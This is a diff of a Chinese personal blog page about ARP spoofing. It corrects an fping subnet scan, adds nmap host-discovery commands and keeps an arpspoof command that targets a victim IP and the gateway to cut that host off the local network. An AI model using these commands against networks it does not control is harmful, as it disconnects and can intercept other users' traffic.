@@ -89,7 +89,7 @@
 <meta property="og:site_name" content="木偶&#39;s blog">
 <meta property="og:description" content="折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。 ARP欺骗原理其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-04T11:13:54.223Z">
+<meta property="og:updated_time" content="2019-05-04T11:19:12.477Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ARP攻击">
 <meta name="twitter:description" content="折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。 ARP欺骗原理其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无">
@@ -369,7 +369,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  873 字
+                  886 字
                 </span>
               
 
@@ -421,8 +421,10 @@
 </code></pre><p>查询网关</p>
 <pre><code>route -n
 </code></pre><p>查询连接在局域网的ip地址</p>
-<pre><code>fping -asg 192.168.1.1/24
+<pre><code>fping -asg 192.168.1.0/24
 fping -asg 网口.0/24
+nmap -sP 192.168.1.0/24
+nmap -sP 网口.0/24
 </code></pre><p>攻击命令</p>
 <pre><code>sudo -s arpspoof -i ens33 -t 192.168.1.102 192.168.1.1
 sudo -s arpspoof -i 网卡 -t 攻击ip  网关
